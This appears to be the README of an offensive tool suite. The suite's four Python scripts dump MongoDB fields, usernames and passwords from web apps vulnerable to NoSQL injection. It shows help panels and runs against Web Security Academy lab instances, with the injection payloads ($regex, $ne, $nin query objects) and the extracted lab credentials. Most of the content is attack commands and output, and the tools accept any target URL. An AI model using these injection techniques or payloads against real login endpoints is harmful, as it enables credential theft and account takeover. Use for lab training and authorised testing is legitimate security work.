# NoSQLI-Attack-Suite
These scripts enumerate usernames and passwords from web applications vulnerable to NoSQL injection in MongoDB databases

## NoSQLI Field Dumper Get Method

### Help panel

```
# python NoSQLI-Field-Dumper-Get-Method.py -h
usage: NoSQLI-Field-Dumper-Get-Method.py [-h] -u  [-p ] [-k] [-o ]

MongoDB Fields Enumeration via NoSQL Injection

options:
  -h, --help      Show this help message and exit
  -u, --url       Target URL (e.g. https://example.com/user/lookup?user=)
  -p, --proxy     Proxy URL (e.g. http://127.0.0.1:8080)
  -k, --insecure  Disable SSL certificate verification (for self-signed certificates/invalid certificates)
  -o, --output    Output file (default: fields.txt)
```

### Usage

```
# python NoSQLI-Field-Dumper-Get-Method.py -u 'https://0a1d00fc04f88096875be31800d700bc.web-security-academy.net/user/lookup?user=' 
[+] Enumerating number of fields: Completed
[+] Fields found: 5

[+] Enumerating field lengths: Completed
[+] Field 0: 3
[+] Field 1: 8
[+] Field 2: 8
[+] Field 3: 5
[+] Field 4: 4

[+] Enumerating field names: Completed
[+] Field 0: _id
[+] Field 1: username
[+] Field 2: password
[+] Field 3: email
[+] Field 4: role

[?] Enter field indexes to dump (0-4, comma-separated) or 'all' for all fields: all

[+] Enumerating field value lengths: Completed
[+] Field 0: 24
[+] Field 1: 6
[+] Field 2: 5
[+] Field 3: 22
[+] Field 4: 4

[+] Enumerating field values: Completed
[+] Field 0: 692c30d55dab93698ca561db
[+] Field 1: wiener
[+] Field 2: peter
[+] Field 3: wiener@normal-user.net
[+] Field 4: user

[*] Fields and values
[*] _id:692c30d55dab93698ca561db
[*] username:wiener
[*] password:peter
[*] email:wiener@normal-user.net
[*] role:user
[*] Results saved to fields.txt
```

## NoSQLI Field Dumper Post Method

### Help panel

```
# python NoSQLI-Field-Dumper-Post-Method.py -h
usage: NoSQLI-Field-Dumper-Post-Method.py [-h] -u  [-p ] [-k] [-o ]

MongoDB Fields Enumeration via NoSQL Injection

options:
  -h, --help      Show this help message and exit
  -u, --url       Target URL (e.g. https://example.com/login)
  -p, --proxy     Proxy URL (e.g. http://127.0.0.1:8080)
  -k, --insecure  Disable SSL certificate verification (for self-signed certificates/invalid certificates)
  -o, --output    Output file (default: fields.txt)
```

### Usage

```
# python NoSQLI-Field-Dumper-Post-Method.py -u https://0a01002d04aceb0a8189481100bf00aa.web-security-academy.net/login                              
[+] Enumerating number of fields: Completed
[+] Fields found: 4

[+] Enumerating field lengths: Completed
[+] Field 0: 3
[+] Field 1: 8
[+] Field 2: 8
[+] Field 3: 5

[+] Enumerating field names: Completed
[+] Field 0: _id
[+] Field 1: username
[+] Field 2: password
[+] Field 3: email

[?] Enter field indexes to dump (0-3, comma-separated) or 'all' for all fields: all

[+] Enumerating field value lengths: Completed
[+] Field 0: 24
[+] Field 1: 6
[+] Field 2: 20
[+] Field 3: 22

[+] Enumerating field values: Completed
[+] Field 0: 69274af055ca7f15ff6bccc7
[+] Field 1: wiener
[+] Field 2: 06ryo7x8fg6acramlazq
[+] Field 3: wiener@normal-user.net

[*] Fields and values
[*] _id:69274af055ca7f15ff6bccc7
[*] username:wiener
[*] password:06ryo7x8fg6acramlazq
[*] email:wiener@normal-user.net
[*] Results saved to fields.txt
```

## NoSQLI User Enumerator

### Help panel

```
# python NoSQLI-User-Enumerator.py -h                                                                           
usage: NoSQLI-User-Enumerator.py [-h] -u  [-p ] [-k] [-o ]

MongoDB Username Enumeration via NoSQL Injection

options:
  -h, --help      Show this help message and exit
  -u, --url       Target URL (e.g. https://example.com/login)
  -p, --proxy     Proxy URL (e.g. http://127.0.0.1:8080)
  -k, --insecure  Disable SSL certificate verification (for self-signed certificates/invalid certificates)
  -o, --output    Output file (default: usernames.txt)
```

### Usage

```
# python NoSQLI-User-Enumerator.py -u https://0a080055032c362d80f23a75003e0098.web-security-academy.net/login -p http://127.0.0.1:8080 
[◥] Enumerating users: {'username': {'$regex': '^c', '$nin': ['wiener', 'carlos', 'adminfmr61qyc']}, 'password': {'$ne': ''}}
[+] ✓ User found: wiener
[+] ✓ User found: carlos
[+] ✓ User found: adminfmr61qyc
[*] Total users found: 3
[*] Users saved to usernames.txt
```

## NoSQLI Password Dumper

### Help panel

```
# python NoSQLI-Password-Dumper.py -h
usage: NoSQLI-Password-Dumper.py [-h] -u  [-p ] [-k] (-uf  | -ul ) [-oc ] [-op ]

Tool to extract passwords using NoSQL Injection in MongoDB

options:
  -h, --help                  Show this help message and exit
  -u, --url                   Target URL of the login endpoint (e.g.: https://example.com/login)
  -p, --proxy                 Proxy URL to intercept traffic (e.g.: http://127.0.0.1:8080)
  -k, --insecure              Disable SSL certificate verification (for self-signed certificates/invalid certificates)
  -uf, --user-file            Text file containing users (one per line)
  -ul, --user-list            Comma-separated list of users (e.g.: admin,root,test)
  -oc, --output-credentials   File to save credentials in user:pass format (default: credentials.txt)
  -op, --output-passwords     File to save only passwords (default: passwords.txt)
```

### Usage

```
# python NoSQLI-Password-Dumper.py -u https://0a080055032c362d80f23a75003e0098.web-security-academy.net/login -ul wiener,adminfmr61qyc,carlos 
[*] Using provided users list
[*] Total users to process: 3
[◐] Enumerating passwords: {'username': 'carlos', 'password': {'$regex': '^epuoerwg1uf5o1apmw3vr'}}
[+] ✓ Credentials found -> wiener:peter
[+] ✓ Credentials found -> adminfmr61qyc:qhgldjomevihy2034s3s
[+] ✓ Credentials found -> carlos:epuoerwg1uf5o1apmw3v
[*] Total passwords found: 3
[*] Credentials saved to credentials.txt
[*] Passwords saved to passwords.txt
```
